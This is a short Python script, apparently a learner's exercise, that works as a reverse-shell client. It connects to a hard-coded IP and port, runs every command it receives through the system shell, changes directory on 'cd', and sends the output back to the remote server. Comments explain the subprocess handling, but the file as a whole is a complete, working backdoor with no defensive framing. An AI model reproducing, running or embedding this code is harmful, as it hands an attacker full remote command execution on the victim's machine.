import socket
import os
import subprocess
import sys

s = socket.socket()
ip = "192.168.231.158"
port = 999

s.connect((ip, port))

while True:
    data = s.recv(1024)

    #take first 2 characters of data, decode and check is the command cd has been entered
    if data[:2].decode("utf-8") == 'cd':
        #if true, from character 3 onwards - change directory to that, decode first! 
        os.chdir(data[3:].decode("utf-8"))
    

    if data[:4].decode("utf-8") == 'exit':
        #if true, from character 4 onwards - close socket and exit, decode first! 
        s.close()
        sys.exit()
    #if data[:].decode("utf-8") == 'hash':
        

    if len(data) > 0:
        if data.decode("utf-8") == ' ':
            pass
        else:
            #shell=True gives access to shell commands
            #stderr=subprocess.PIPE: This parameter is used to redirect and capture the standard error output of the executed command. By setting stderr=subprocess.PIPE, the error output of the command will be captured and made available through the stderr attribute of the subprocess.Popen object
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            
            #output of stdout, stdin, stderr is bytes so need to decode to read, so utf-8 decode required to print cmds to screen
            output_b = cmd.stdout.read()
            output_s = str(output_b, "utf-8")
            
            #cwd = os.getcwd() + " "
            print(str.encode(output_s))
            s.send(str.encode(output_s))

            print("The command sent from server was: {}".format(data[:].decode("utf-8")))
